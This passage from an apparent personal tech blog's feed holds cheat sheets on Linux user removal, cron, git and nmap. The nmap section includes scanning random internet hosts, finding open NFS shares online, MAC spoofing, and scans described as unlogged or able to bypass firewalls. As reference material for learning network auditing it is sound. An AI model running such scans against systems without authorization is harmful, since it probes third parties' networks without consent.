&lt;span class=&quot;c&quot;&gt;# delete jobs&lt;/span&gt;
find /var/spool/at/ &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[^.]*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; jean &lt;span class=&quot;nt&quot;&gt;-delete&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# delete cron jobs&lt;/span&gt;
crontab &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jean

&lt;span class=&quot;c&quot;&gt;# remove printf jobs&lt;/span&gt;
lprm jean

&lt;span class=&quot;c&quot;&gt;# find all files&lt;/span&gt;
find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; jean &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;newUserName:newGroupName &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# finally delete user&lt;/span&gt;
userdel &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; jean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;cron&quot;&gt;cron&lt;/h1&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# éditer la crontab&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crontab &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# afficher le contenu&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crontab &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Example of job definition:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# .---------------- minute (0 - 59)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# |  .------------- hour (0 - 23)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# |  |  .---------- day of month (1 - 31)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# |  |  |  |  |&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# *  *  *  *  *  user command to be executed&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>git</title>
   <link href="http://localhost:4000/linux/2018/05/16/git/"/>
   <updated>2018-05-16T00:00:00+02:00</updated>
   <id>http://localhost:4000/linux/2018/05/16/git</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;basic&quot;&gt;basic&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cloner un projet&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit

&lt;span class=&quot;c&quot;&gt;# on tire&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git fetch

&lt;span class=&quot;c&quot;&gt;# on tire et on update&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git pull

&lt;span class=&quot;c&quot;&gt;# on pousse&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push

&lt;span class=&quot;c&quot;&gt;# ajout en zone de staging&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on supprime&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on déplace&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# status&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

&lt;span class=&quot;c&quot;&gt;# ajouter un dépôt&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote add origin https://…

&lt;span class=&quot;c&quot;&gt;# consulter espaces distants&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ajouter modifs au dernier commit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;--amend&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# propose màj du message&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# connaitre configuration du dépôt&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config -—list

&lt;span class=&quot;c&quot;&gt;# pour avoir détail sur les modifications&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git show debut_sha
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;history&quot;&gt;history&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# modifications depuis le dernier commit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git diff HEAD

&lt;span class=&quot;c&quot;&gt;# historique&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--graph&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--oneline&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# qui a écrit cette ligne ?&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git blame main.cpp
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git gui blame main.cpp

&lt;span class=&quot;c&quot;&gt;# aller-retour&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout 2168f46
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master

&lt;span class=&quot;c&quot;&gt;# récupérer la version d'un fichier à ce commit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout 1123 index.php
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master index.php

&lt;span class=&quot;c&quot;&gt;# reviens à un état et garde les modifs en non stagées&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reset 2168f46 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--mixed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# reviens à un état et garde les modifs en stagées&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reset 2168f46 &lt;span class=&quot;nt&quot;&gt;--soft&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# revient au dernier commit sans les modifs entre le HEAD et maitenant&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reset &lt;span class=&quot;nt&quot;&gt;--hard&lt;/span&gt; 

&lt;span class=&quot;c&quot;&gt;# annuler un add&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reset HEAD &amp;lt;file&amp;gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--oneline&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; index.php

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reflog
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reset &lt;span class=&quot;s1&quot;&gt;'HEAD@{1}'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;branches&quot;&gt;branches&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# créer une branche&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch new-feature

&lt;span class=&quot;c&quot;&gt;# on saute sur cette branche&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout new-feature

&lt;span class=&quot;c&quot;&gt;# branche courante&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; master
  new-feature

&lt;span class=&quot;c&quot;&gt;# on bosse...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# on commit&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on revient sur master&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master

&lt;span class=&quot;c&quot;&gt;# fusion: être sur la branche qui va recevoir (ex: master)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge new-feature

&lt;span class=&quot;c&quot;&gt;# on supprime la branche car plus utilée&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; new-feature
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;git-hooks&quot;&gt;git hooks&lt;/h2&gt;
&lt;hr /&gt;
</content>
 </entry>
 
 <entry>
   <title>nmap</title>
   <link href="http://localhost:4000/linux/2018/05/12/nmap/"/>
   <updated>2018-05-12T00:00:00+02:00</updated>
   <id>http://localhost:4000/linux/2018/05/12/nmap</id>
   <content type="html">&lt;!--more--&gt;

&lt;p&gt;&lt;em&gt;Network Mapper&lt;/em&gt; is a free and open source utility for network discovery and security auditing.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;recap&quot;&gt;recap&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# fast tcp scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; fast_tcp_scan.nmap 10.10.10.10

&lt;span class=&quot;c&quot;&gt;# full tcp scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; full_tcp_scan.nmap 10.10.10.10


&lt;span class=&quot;c&quot;&gt;# fast udp scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; fast_udp_scan.nmap 10.10.10.10

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; full_udp_scan.nmap 10.10.10.10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;select&quot;&gt;select&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;host&quot;&gt;host&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# classic&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap 192.168.1.0-255,192.168.1.0/24

&lt;span class=&quot;c&quot;&gt;# from file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-iL&lt;/span&gt; targets.txt

&lt;span class=&quot;c&quot;&gt;# exclude hosts&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap 10.0.0.1-255 &lt;span class=&quot;nt&quot;&gt;--exclude&lt;/span&gt; 10.0.0.1,10.0.0.10

&lt;span class=&quot;c&quot;&gt;# scan 10 random targets on internet&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-iR&lt;/span&gt; 10

&lt;span class=&quot;c&quot;&gt;# find random NFS shares online&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p2049&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iR&lt;/span&gt; 0 

&lt;span class=&quot;c&quot;&gt;# collect signature of web servers&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-headers,http-title,ssl-cert &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; http.useragent&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A web crawler :)&quot;&lt;/span&gt;,http-headers.useget &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; random-webservers.xml &lt;span class=&quot;nt&quot;&gt;-iR&lt;/span&gt; 0
&lt;span class=&quot;c&quot;&gt;# -Pn : without ping&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T4 : aggressive timing template&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;portinterface&quot;&gt;port/interface&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# select ports&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p1-100&lt;/span&gt;,80,443 10.0.0.1

&lt;span class=&quot;c&quot;&gt;# ports by protocol (T:tcp, U:udp)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-pT&lt;/span&gt;:25,U:53 10.0.0.1

&lt;span class=&quot;c&quot;&gt;# exclude ports&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p1-100&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--exclude-ports&lt;/span&gt; 22,53 10.0.0.1

&lt;span class=&quot;c&quot;&gt;# all ports&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.0.0.1

&lt;span class=&quot;c&quot;&gt;# select interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; eth1 scanme.nmap.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;port-states&quot;&gt;port states&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt;: a service is listening for connections&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;closed&lt;/code&gt;: port is accessible (it receives and responds to nmap packets), but there is no application listening on it.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;filtered&lt;/code&gt;: no signs that the packets were received and the state could not be established, packets are being dropped by some kind of filtering&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;unprivileged users&lt;/strong&gt; : by default use TCP Connect Scan, uses the high-level &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; system call (slower)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;privilaged user&lt;/strong&gt; : by default launches a SYN Stealth Scan, use raw packets to send specially crafted TCP packets, technique known as half open.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;serviceos-fingerprinting&quot;&gt;service/OS fingerprinting&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# service detection&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;# OS detection&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;# -sV + -O + -sC (script scanning) + --traceroute&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; scanme.nmap.org 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;host-discovery&quot;&gt;host discovery&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# TCP SYN scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PS80&lt;/span&gt;,21 192.168.1.0/24
&lt;span class=&quot;c&quot;&gt;# -sn: ping scan - disable port scan&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# send a TCP SYN&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive an RST -&amp;gt; close&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive an SYN/ACK -&amp;gt; open&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# --packet-trace: show all data sent and received&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# TCP ACK scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PA&lt;/span&gt; 192.168.1.0/24
&lt;span class=&quot;c&quot;&gt;# send a TCP ACK&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive nothing -&amp;gt; close&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive an TCP RST -&amp;gt; open&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# UDP scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PU&lt;/span&gt; 192.168.1.0/24
&lt;span class=&quot;c&quot;&gt;# send an empty UDP packet to port 40125&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive ICMP port unreachable -&amp;gt; online&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive various ICMP error messages -&amp;gt; offline&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (important to choose closed ports)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ICMP ping scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PE&lt;/span&gt; 192.168.1.0/24 &lt;span class=&quot;c&quot;&gt;# ICMP echo request&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PP&lt;/span&gt; 192.168.1.0/24 &lt;span class=&quot;c&quot;&gt;# ICMP timestamp reply&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PM&lt;/span&gt; 192.168.1.0/24 &lt;span class=&quot;c&quot;&gt;# ICMP address mark reply&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# can bypass misconfigured firewalls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# IP protocol scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PO&lt;/span&gt; 192.168.1.0/24
&lt;span class=&quot;c&quot;&gt;# -PO: by default use different protocols IGMP, IP-in-IP and ICMP&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PO1&lt;/span&gt;,2,17 scanme.nmap.org &lt;span class=&quot;c&quot;&gt;# choose protocol with their numbers&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# TCP: 6, UDP: 17, ICMP: 1, IGMP: 2, IP-in-IP: 4, SCTP: 132&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# all packets send are empty, it is a good think to send data inside them&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PO&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-length&lt;/span&gt; 100 scanme.nmap.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ARP scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PR&lt;/span&gt; 192.168.1.0/24
&lt;span class=&quot;c&quot;&gt;# send ARP requests to all&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# if ARP reply -&amp;gt; online&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# else -&amp;gt; offline&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# used by default by nmap in LAN, -PS to disable&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--packet-trace&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--send-ip&lt;/span&gt; 192.168.1.254

&lt;span class=&quot;c&quot;&gt;# MAC address spoofing&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PR&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--spoof-mac&lt;/span&gt; &amp;lt;mac address&amp;gt; scname.nmap.org
&lt;span class=&quot;c&quot;&gt;# with -PR we can use IPv6 and it will use ICMPv6 (replace ARP in v4)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;scan-techniques&quot;&gt;scan techniques&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# TCP SYN (not logged)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;# full handshake with connect() (logged)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;# TCP ACK&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sA&lt;/span&gt; scanme.nmap.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
